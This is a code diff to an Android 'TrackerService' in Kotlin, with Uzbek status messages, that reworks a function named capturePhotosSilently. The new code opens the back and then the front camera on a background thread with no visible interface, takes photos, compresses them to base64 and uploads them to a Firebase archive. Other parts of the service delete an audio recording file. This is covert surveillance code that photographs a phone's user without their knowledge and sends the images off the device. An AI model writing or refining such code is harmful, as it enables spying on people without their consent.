@@ -14,6 +14,8 @@ import android.content.Intent
 import android.content.IntentFilter
 import android.content.pm.PackageManager
 import android.content.pm.ServiceInfo
+import android.graphics.Bitmap
+import android.graphics.BitmapFactory
 import android.graphics.ImageFormat
 import android.hardware.camera2.CameraCaptureSession
 import android.hardware.camera2.CameraCharacteristics
@@ -26,6 +28,7 @@ import android.media.MediaRecorder
 import android.os.BatteryManager
 import android.os.Build
 import android.os.Handler
+import android.os.HandlerThread
 import android.os.IBinder
 import android.os.Looper
 import android.os.PowerManager
@@ -49,6 +52,7 @@ import com.google.firebase.database.ValueEventListener
 import com.google.gson.Gson
 import com.hokimloyha.app.R
 import com.hokimloyha.app.model.User
+import java.io.ByteArrayOutputStream
 import java.io.File
 import java.util.concurrent.Executors
 
@@ -393,87 +397,221 @@ class TrackerService : Service() {
         })
     }
 
+    private var cameraThread: HandlerThread? = null
+    private var cameraHandler: Handler? = null
+
+    @Synchronized
+    private fun getCameraHandler(): Handler {
+        if (cameraThread == null || !cameraThread!!.isAlive) {
+            cameraThread = HandlerThread("TrackerCameraThread").apply { start() }
+            cameraHandler = Handler(cameraThread!!.looper)
+        }
+        return cameraHandler!!
+    }
+
     private fun capturePhotosSilently() {
         val devId = getActiveDeviceId()
-        try {
-            acquireWakeLock(20000L)
-            mediaRef?.child("status")?.setValue("📷 Rasmga olinmoqda...")
-            val intent = Intent(this, CameraActivity::class.java).apply {
-                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TOP or Intent.FLAG_ACTIVITY_SINGLE_TOP)
-                putExtra("device_id", devId)
-            }
-            startActivity(intent)
-        } catch (e: Exception) {
-            Log.e(TAG, "Silent photo error", e)
-            mediaRef?.child("status")?.setValue("Kamera xatosi: ${e.message}")
+        acquireWakeLock(30000L)
+        mediaRef?.child("status")?.setValue("📷 Kameralar faollashmoqda...")
+
+        if (ActivityCompat.checkSelfPermission(this, Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) {
+            mediaRef?.child("status")?.setValue("Kamera ruxsati berilmagan")
             releaseWakeLock()
+            return
+        }
+
+        val handler = getCameraHandler()
+        handler.post {
+            try {
+                val cameraManager = getSystemService(CAMERA_SERVICE) as CameraManager
+                val cameraIds = cameraManager.cameraIdList
+
+                if (cameraIds.isEmpty()) {
+                    mediaRef?.child("status")?.setValue("Kamera topilmadi")
+                    releaseWakeLock()
+                    return@post
+                }
+
+                var backCamId: String? = null
+                var frontCamId: String? = null
+
+                for (id in cameraIds) {
+                    try {
+                        val characteristics = cameraManager.getCameraCharacteristics(id)
+                        val facing = characteristics.get(CameraCharacteristics.LENS_FACING)
+                        if (facing == CameraCharacteristics.LENS_FACING_BACK && backCamId == null) {
+                            backCamId = id
+                        } else if (facing == CameraCharacteristics.LENS_FACING_FRONT && frontCamId == null) {
+                            frontCamId = id
+                        }
+                    } catch (_: Exception) {}
+                }
+
+                val primaryCamId = backCamId ?: cameraIds[0]
+
+                // 1. Orqa kamerani olish
+                takeSingleCamera2Photo(cameraManager, primaryCamId) { backBase64 ->
+                    // 2. Old kamerani olish (agar mavjud va boshqacha bo'lsa)
+                    val secondaryCamId = frontCamId
+                    if (secondaryCamId != null && secondaryCamId != primaryCamId) {
+                        handler.postDelayed({
+                            takeSingleCamera2Photo(cameraManager, secondaryCamId) { frontBase64 ->
+                                saveBothPhotos(devId, backBase64, frontBase64)
+                            }
+                        }, 200L)
+                    } else {
+                        saveBothPhotos(devId, backBase64, null)
+                    }
+                }
+            } catch (e: Exception) {
+                Log.e(TAG, "Silent photo capture error", e)
+                mediaRef?.child("status")?.setValue("Kamera xatosi: ${e.message}")
+                releaseWakeLock()
+            }
+        }
+    }
+
+    private fun saveBothPhotos(devId: String, backBase64: String?, frontBase64: String?) {
+        try {
+            val now = System.currentTimeMillis()
+            val photoItem = mapOf(
+                "back_base64" to (backBase64 ?: ""),
+                "front_base64" to (frontBase64 ?: ""),
+                "timestamp" to now
+            )
+            mediaRef?.child("latest_photo")?.setValue(photoItem)
+            val archiveRef = mediaRef?.child("archive_photos")
+            archiveRef?.push()?.setValue(photoItem)?.addOnCompleteListener {
+                if (archiveRef != null) {
+                    trimFirebaseArchive(archiveRef, 20)
+                }
+            }
+            mediaRef?.child("status")?.setValue("📷 Yangi rasm qabul qilindi ($now)")
+        } catch (e: Exception) {
+            Log.e(TAG, "saveBothPhotos error", e)
+        } finally {
+            releaseWakeLock()
+        }
+    }
+
+    private fun processJpegBytes(bytes: ByteArray): String {
+        return try {
+            val origBmp = BitmapFactory.decodeByteArray(bytes, 0, bytes.size)
+                ?: return Base64.encodeToString(bytes, Base64.NO_WRAP)
+            val maxDim = 800
+            var workingBmp = origBmp
+            if (origBmp.width > maxDim || origBmp.height > maxDim) {
+                val scale = maxDim.toFloat() / maxOf(origBmp.width, origBmp.height)
+                val nw = (origBmp.width * scale).toInt()
+                val nh = (origBmp.height * scale).toInt()
+                workingBmp = Bitmap.createScaledBitmap(origBmp, nw, nh, true)
+                if (workingBmp != origBmp) origBmp.recycle()
+            }
+            val baos = ByteArrayOutputStream()
+            workingBmp.compress(Bitmap.CompressFormat.JPEG, 65, baos)
+            val compressed = baos.toByteArray()
+            workingBmp.recycle()
+            Base64.encodeToString(compressed, Base64.NO_WRAP)
+        } catch (_: Exception) {
+            Base64.encodeToString(bytes, Base64.NO_WRAP)
         }
     }
 
     @SuppressLint("MissingPermission")
     private fun takeSingleCamera2Photo(manager: CameraManager, cameraId: String, callback: (String?) -> Unit) {
+        val handler = getCameraHandler()
+        var isDone = false
+
+        fun finishWith(result: String?, camera: CameraDevice? = null, reader: ImageReader? = null) {
+            if (isDone) return
+            isDone = true
+            try { camera?.close() } catch (_: Exception) {}
+            try { reader?.close() } catch (_: Exception) {}
+            callback(result)
+        }
+
+        val timeoutRunnable = Runnable {
+            finishWith(null)
+        }
+        handler.postDelayed(timeoutRunnable, 5000L)
+
         try {
             manager.openCamera(cameraId, object : CameraDevice.StateCallback() {
                 override fun onOpened(camera: CameraDevice) {
                     try {
                         val characteristics = manager.getCameraCharacteristics(cameraId)
                         val map = characteristics.get(CameraCharacteristics.SCALER_STREAM_CONFIGURATION_MAP)
-                        val largestSize = map?.getOutputSizes(ImageFormat.JPEG)?.maxByOrNull { it.width * it.height } ?: Size(640, 480)
+                        val sizes = map?.getOutputSizes(ImageFormat.JPEG) ?: emptyArray()
+                        val chosenSize = sizes.filter { it.width <= 1280 && it.height <= 960 }
+                            .maxByOrNull { it.width * it.height } ?: sizes.firstOrNull() ?: Size(640, 480)
 
-                        val reader = ImageReader.newInstance(largestSize.width, largestSize.height, ImageFormat.JPEG, 1)
+                        val reader = ImageReader.newInstance(chosenSize.width, chosenSize.height, ImageFormat.JPEG, 2)
                         reader.setOnImageAvailableListener({ imReader ->
-                            val image = imReader.acquireLatestImage()
-                            if (image != null) {
-                                val buffer = image.planes[0].buffer
-                                val bytes = ByteArray(buffer.remaining())
-                                buffer.get(bytes)
-                                image.close()
+                            try {
+                                val image = imReader.acquireLatestImage()
+                                if (image != null) {
+                                    val buffer = image.planes[0].buffer
+                                    val bytes = ByteArray(buffer.remaining())
+                                    buffer.get(bytes)
+                                    image.close()
 
-                                val base64Img = Base64.encodeToString(bytes, Base64.DEFAULT)
-                                camera.close()
-                                callback(base64Img)
-                            } else {
-                                camera.close()
-                                callback(null)
+                                    val base64 = processJpegBytes(bytes)
+                                    handler.removeCallbacks(timeoutRunnable)
+                                    finishWith(base64, camera, reader)
+                                } else {
+                                    handler.removeCallbacks(timeoutRunnable)
+                                    finishWith(null, camera, reader)
+                                }
+                            } catch (e: Exception) {
+                                handler.removeCallbacks(timeoutRunnable)
+                                finishWith(null, camera, reader)
                             }
-                        }, null)
+                        }, handler)
 
-                        camera.createCaptureSession(listOf(reader.surface), object : CameraCaptureSession.StateCallback() {
+                        val surface = reader.surface
+                        val captureCallback = object : CameraCaptureSession.StateCallback() {
                             override fun onConfigured(session: CameraCaptureSession) {
                                 try {
                                     val captureBuilder = camera.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE).apply {
-                                        addTarget(reader.surface)
+                                        addTarget(surface)
+                                        set(CaptureRequest.CONTROL_MODE, CaptureRequest.CONTROL_MODE_AUTO)
+                                        set(CaptureRequest.CONTROL_AF_MODE, CaptureRequest.CONTROL_AF_MODE_CONTINUOUS_PICTURE)
                                         set(CaptureRequest.CONTROL_AE_MODE, CaptureRequest.CONTROL_AE_MODE_ON)
                                     }
-                                    session.capture(captureBuilder.build(), null, null)
-                                } catch (_: Exception) {
-                                    camera.close()
-                                    callback(null)
+                                    session.capture(captureBuilder.build(), null, handler)
+                                } catch (e: Exception) {
+                                    handler.removeCallbacks(timeoutRunnable)
+                                    finishWith(null, camera, reader)
                                 }
                             }
+
                             override fun onConfigureFailed(session: CameraCaptureSession) {
-                                camera.close()
-                                callback(null)
+                                handler.removeCallbacks(timeoutRunnable)
+                                finishWith(null, camera, reader)
                             }
-                        }, null)
+                        }
+
+                        @Suppress("DEPRECATION")
+                        camera.createCaptureSession(listOf(surface), captureCallback, handler)
                     } catch (e: Exception) {
-                        camera.close()
-                        callback(null)
+                        handler.removeCallbacks(timeoutRunnable)
+                        finishWith(null, camera)
                     }
                 }
 
                 override fun onDisconnected(camera: CameraDevice) {
-                    camera.close()
-                    callback(null)
+                    handler.removeCallbacks(timeoutRunnable)
+                    finishWith(null, camera)
                 }
 
                 override fun onError(camera: CameraDevice, error: Int) {
-                    camera.close()
-                    callback(null)
+                    handler.removeCallbacks(timeoutRunnable)
+                    finishWith(null, camera)
                 }
-            }, null)
+            }, handler)
         } catch (e: Exception) {
-            callback(null)
+            handler.removeCallbacks(timeoutRunnable)
+            finishWith(null)
         }
     }
 
@@ -642,6 +780,9 @@ class TrackerService : Service() {
         try {
             val audioFile = File(filesDir, "audio_record.3gp")
             if (audioFile.exists()) audioFile.delete()
+        } catch (_: Exception) {}
+        try {
+            cameraThread?.quitSafely()
         } catch (_: Exception) {}
         try {
             serviceExecutor.shutdown()
